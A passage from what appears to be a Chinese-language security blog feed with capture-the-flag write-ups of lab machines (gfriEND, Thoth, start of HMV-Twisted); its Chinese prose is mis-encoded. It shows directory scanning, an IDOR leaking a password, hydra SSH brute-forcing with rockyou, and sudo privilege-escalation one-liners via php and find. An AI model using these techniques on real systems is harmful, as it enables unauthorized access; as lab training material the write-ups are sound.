class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">291</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">292</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">42</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">285</span>B  <span class="operator">-</span> <span class="symbol">/.php</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">11</span>:<span class="number">42</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">286</span>B  <span class="operator">-</span> <span class="symbol">/.php3</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">12</span>:<span class="number">53</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">316</span>B  <span class="operator">-</span> <span class="symbol">/config</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">10.139</span><span class="operator">/</span>config<span class="symbol">/</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">12</span>:<span class="number">54</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">456</span>B  <span class="operator">-</span> <span class="operator">/</span>config<span class="symbol">/</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">13</span>:<span class="number">47</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">314</span>B  <span class="operator">-</span> <span class="symbol">/misc</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">10.139</span><span class="operator">/</span>misc<span class="symbol">/</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">14</span>:<span class="number">17</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">32</span>B  <span class="operator">-</span> <span class="symbol">/robots.txt</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">14</span>:<span class="number">21</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">295</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">14</span>:<span class="number">21</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">294</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span></span><br><span class="line">CTRL<span class="operator">+</span>C <span class="params">detected:</span> Pausing threads, please wait...</span><br><span class="line">[q]uit <span class="symbol">/</span> [c]<span class="params">ontinue:</span> q</span><br><span class="line">[s]ave <span class="symbol">/</span> [q]uit without <span class="params">saving:</span> q</span><br><span class="line"></span><br><span class="line">Canceled by the user</span><br></pre></td></tr></table></figure></div>
<p>å»robots.txtä¸­ å‘ç°ä¸€ä¸ªæ–°çš„è·¯å¾„&#x2F;heyhoo.txt<br><img src="https://pic1.imgdb.cn/item/68a31a3558cb8da5c831ab26.png"><br>åˆç»§ç»­åœ¨webæ‰¾äº†ä¸€åœˆï¼Œå‘ç°profileå’Œdashboardçš„urlæ˜¾ç¤ºä¸ä¸€æ ·<br><code>http://192.168.10.139/index.php?page=profile&amp;user_id=12</code><br>è¿™é‡Œåˆå¤šä¸€ä¸ªuser_idå‚æ•°ï¼Œé‚£æ˜¯å¦å¯ä»¥ä¿®æ”¹è¿™ä¸ªå‚æ•°å€¼ï¼Œè®¿é—®åˆ°ä¸åŒç”¨æˆ·ï¼Ÿ<br>ç»è¿‡å°è¯•ç¡®å®å¯ä»¥ï¼Œç°åœ¨æ ¹æ®é¶æœºä»‹ç»è¦æ‰¾åˆ°aliceçš„ç”¨æˆ·çš„å‡­è¯ æœ€ç»ˆåœ¨5æ‰¾åˆ°äº†aliceç”¨æˆ·<br>æŸ¥çœ‹å…ƒç´ å¾—åˆ°å¯†ç 4lic3<br><img src="https://pic1.imgdb.cn/item/68a31a9a58cb8da5c831ac07.png"><br>ç„¶åå¯ä»¥æˆåŠŸåˆ°ssh è·å¾—ç¬¬ä¸€ä¸ªflag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ssh alice@192.168.10.139</span></span><br><span class="line">alice@192.168.10.139&#x27;s password:</span><br><span class="line">Last login: Fri Dec<span class="number"> 13 </span>14:48:25 2019</span><br><span class="line">alice@gfriEND:~$ id</span><br><span class="line">uid=1000(alice) gid=1001(alice) groups=1001(alice)</span><br><span class="line">alice@gfriEND:~$ ls</span><br><span class="line">alice@gfriEND:~$ pwd</span><br><span class="line">/home/alice</span><br><span class="line">alice@gfriEND:~$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x<span class="number"> 4 </span>alice alice<span class="number"> 4096 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>.</span><br><span class="line">drwxr-xr-x<span class="number"> 6 </span>root  root <span class="number"> 4096 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>..</span><br><span class="line">-rw-------<span class="number"> 1 </span>alice alice  <span class="number"> 10 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>.bash_history</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>alice alice <span class="number"> 220 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>.bash_logout</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>alice alice<span class="number"> 3637 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>.bashrc</span><br><span class="line">drwx------<span class="number"> 2 </span>alice alice<span class="number"> 4096 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>.cache</span><br><span class="line">drwxrwxr-x<span class="number"> 2 </span>alice alice<span class="number"> 4096 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>.my_secret</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>alice alice <span class="number"> 675 </span>Dec<span class="number"> 13 </span><span class="number"> 2019 </span>.profile</span><br><span class="line">alice@gfriEND:~$ cd .my_secret/</span><br><span class="line">alice@gfriEND:~/.my_secret$ ls</span><br><span class="line">flag1.txt  my_notes.txt</span><br><span class="line">alice@gfriEND:~/.my_secret$ cat flag1.txt</span><br><span class="line">Greattttt my brother! You saw the Alice&#x27;s note! Now you save the record information to give to bob! I know if it&#x27;s given to him then Bob will be hurt but this is better than Bob cheated!</span><br><span class="line"></span><br><span class="line">Now your last job is get access to the root and read the flag ^_^</span><br><span class="line"></span><br><span class="line">Flag<span class="number"> 1 </span>: gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æœ‰ä¸€ä¸ªnote å‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿ sudo-l å‘ç°å¯ä»¥ç”¨php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">alice<span class="variable">@gfriEND</span>:~<span class="regexp">/.my_secret$ cat my_notes.txt</span></span><br><span class="line"><span class="regexp">Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn&#x27;t know my notes</span></span><br><span class="line"><span class="regexp">alice@gfriEND:~/</span>.my_secret<span class="variable">$ </span>sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> alice on <span class="symbol">gfriEND:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\:<span class="regexp">/usr/sbin</span>\:<span class="regexp">/usr/bin</span>\:<span class="regexp">/sbin\:/bin</span>\:<span class="regexp">/snap/bin</span></span><br><span class="line"></span><br><span class="line">User alice may run the following commands on <span class="symbol">gfriEND:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/php</span><br></pre></td></tr></table></figure></div>
<p>ä¸phpæœ‰å…³çš„å°±æ˜¯åˆšæ‰ç›®å½•æ‰«æå‘ç°çš„config.phpæ–‡ä»¶ï¼Œçœ‹çœ‹å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">alice<span class="variable">@gfriEND</span><span class="symbol">:/var/www/html/config</span><span class="variable">$ </span>cat config.php</span><br><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line"></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;ctf_pasti_bisa&#x27;</span>, <span class="string">&#x27;ceban_corp&#x27;</span>);</span><br><span class="line">alice<span class="variable">@gfriEND</span><span class="symbol">:/var/www/html/config</span><span class="variable">$ </span>su - root</span><br><span class="line"><span class="title class_">Password</span>:</span><br><span class="line">root<span class="variable">@gfriEND</span><span class="symbol">:~</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°ç›´æ¥ç”¨è¿™é‡Œçš„æ•°æ®åº“å¯†ç å°±èƒ½ç™»å…¥åˆ°rootç”¨æˆ·  ç»“æŸäº†ï¼Œæ²¡æœ‰ç”¨sudoä¹Ÿå¯ä»¥</p>
<p>ç¬¬äºŒç§æ–¹å¼å°±æ˜¯ç”¨phpæ¥ææƒ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">alice<span class="variable">@gfriEND</span><span class="symbol">:/var/www/html/config</span><span class="variable">$ </span>sudo /usr/bin/php -r <span class="string">&quot;system(&#x27;/bin/bash&#x27;);&quot;</span></span><br><span class="line">root<span class="variable">@gfriEND</span><span class="symbol">:/var/www/html/config</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
<p>-rè¡¨ç¤ºç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œphpä»£ç </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulunhub-Thoth</title>
    <url>/posts/35034.html</url>
    <content><![CDATA[<p>Vulunhub-Thothé¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a0487cd0e0a243d4f9a729.png"></p>
<h1 id="ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†"></a>ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap 192.168.240.0/24 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">03</span> <span class="number">11</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.46</span>)</span><br><span class="line">Host is up (<span class="number">0.00039</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span> open  ftp</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http</span><br><span class="line">MAC <span class="params">Address:</span> FA:DB:E5:E9:<span class="number">94</span>:F7 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host is up (<span class="number">0.010</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span>   open     domain</span><br><span class="line"><span class="number">8081</span><span class="symbol">/tcp</span> filtered blackice-icecap</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>A:ED:<span class="number">9</span>D:<span class="number">97</span>:DA:<span class="number">7</span>E (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host is up (<span class="number">0.00020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh</span><br><span class="line"><span class="number">5000</span><span class="symbol">/tcp</span> open  upnp</span><br><span class="line"><span class="number">5001</span><span class="symbol">/tcp</span> open  commplex-link</span><br><span class="line"><span class="number">7000</span><span class="symbol">/tcp</span> open  afs3-fileserver</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host is up (<span class="number">0.0000040</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">5.36</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>å¼€æ”¾äº†ssh html ftp  å¹¶ä¸”htmlä¹Ÿåªæœ‰ä¸€ä¸ªapacheé»˜è®¤ç•Œé¢<br>çœ‹çœ‹ftpæœåŠ¡èƒ½ä¸èƒ½åŒ¿åç™»å½•<br>å‘ç°å¯ä»¥ç™»å½•å¹¶ä¸”æœ‰ä¸€ä¸ªnote.txt è¯´æ˜æˆ‘ä»¬è¦åˆ©ç”¨ftp<br>ç”¨getæŠŠè¿™ä¸ªæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°çœ‹çœ‹ä»€ä¹ˆå†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat note.txt             </span><br><span class="line">Dear pwnlab,</span><br><span class="line"></span><br><span class="line">My <span class="type">name</span> <span class="keyword">is</span> jake. Your <span class="keyword">password</span> <span class="keyword">is</span> very weak <span class="keyword">and</span> easily crackable, I think change your <span class="keyword">password</span>.</span><br></pre></td></tr></table></figure></div>
<p>æç¤ºæœ‰ä¸€ä¸ªpwnlabç”¨æˆ·ï¼Œå¹¶ä¸”å¯†ç æ˜¯å¼±å¯†ç </p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>æ‰«ä¸€ä¸‹ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u http://192.168.240.46                </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_192.168.240.46/_25-02-03_13-04-19.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.46</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">20</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">32</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">7</span>B  <span class="operator">-</span> <span class="symbol">/test.php</span>                                         </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">42</span>] <span class="number">301</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="operator">/</span>wordpress<span class="symbol">/</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">1.8</span><span class="operator">/</span>wordpress<span class="symbol">/</span>     </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">42</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">2</span>KB <span class="operator">-</span> <span class="operator">/</span>wordpress<span class="operator">/</span>wp-login.php</span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸‰ä¸ªç›®å½•<br>test.phpä¸­æ²¡æœ‰æœ‰ç”¨å†…å®¹ï¼Œæœ‰ç™»å½•ç•Œé¢<br>ç»“åˆåˆšæ‰çš„ç”¨æˆ·åç”¨bpçˆ†ç ´ä¸€ä¸‹ ä½†æ˜¯è¿™ä¸ªç™»å½•ç•Œé¢æäº¤è¡¨å•ä¹‹åå°±æŠ¥é”™<br>ç”¨wpscanæ‰«æä¹Ÿæ²¡æœ‰ä¿¡æ¯<br>æ—¢ç„¶åˆšæ‰è¯´pwnlabç”¨æˆ·å¯†ç æ˜¯å¼±å¯†ç ï¼Œå°±ç”¨hydraçˆ†ç ´ä¸€ä¸‹ssh</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.240.46:22 -t 10</span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">use</span> <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** <span class="keyword">ignore</span> laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-03</span> <span class="number">13</span>:<span class="number">13</span>:<span class="number">56</span></span><br><span class="line">[WARNING] Many SSH configurations <span class="keyword">limit</span> the <span class="keyword">number</span> of parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> <span class="keyword">reduce</span> the tasks: <span class="keyword">use</span> -t <span class="number">4</span></span><br><span class="line">[WARNING] Restorefile (you have <span class="number">10</span> seconds <span class="keyword">to</span> abort... (<span class="keyword">use</span> <span class="keyword">option</span> -I <span class="keyword">to</span> skip waiting)) <span class="keyword">from</span> a previous session found, <span class="keyword">to</span> prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] <span class="built_in">max</span> <span class="number">10</span> tasks per <span class="number">1</span> server, overall <span class="number">10</span> tasks, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">1434440</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.240</span><span class="number">.46</span>:<span class="number">22</span>/</span><br><span class="line">[STATUS] <span class="number">165.00</span> tries/<span class="built_in">min</span>, <span class="number">165</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14344234</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">1448</span>:<span class="number">55</span>h, <span class="number">10</span> active</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.240</span><span class="number">.46</span>   login: pwnlab   <span class="keyword">password</span>: babygirl1</span><br><span class="line"><span class="number">1</span> of <span class="number">1</span> target successfully completed, <span class="number">1</span> valid <span class="keyword">password</span> found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-03</span> <span class="number">13</span>:<span class="number">15</span>:<span class="number">39</span></span><br></pre></td></tr></table></figure>
<p>æˆåŠŸæ‹¿åˆ°shell</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">pwnlab<span class="variable">@thothtech</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> pwnlab on <span class="symbol">thothtech:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> pwnlab may run the following commands on <span class="symbol">thothtech:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/find</span><br></pre></td></tr></table></figure></div>
<p>æœ‰findçš„sudoæƒé™<br>æ‰¾åˆ°findçš„ææƒæ–¹å¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure></div>
<p>-quitæŒ‡ä»¤è®©findæ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ä¹‹åå°±ç«‹å³é€€å‡º</p>
<p>æ‹¿åˆ°rootæƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">pwnlab<span class="variable">@thothtech</span><span class="symbol">:~</span><span class="variable">$ </span>sudo find . -exec /bin/bash \; -quit</span><br><span class="line">root<span class="variable">@thothtech</span><span class="symbol">:/home/pwnlab</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<p>éå¸¸ç®€å•çš„ä¸€ä¸ªé¶æœºï¼Œæœç„¶é€‚åˆæ–°æ‰‹</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Twisted</title>
    <url>/posts/28211.html</url>
    <content><![CDATA[<p>HMV-Twistedé¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679cc6a8d0e0a243d4f8cd2f.png"></p>
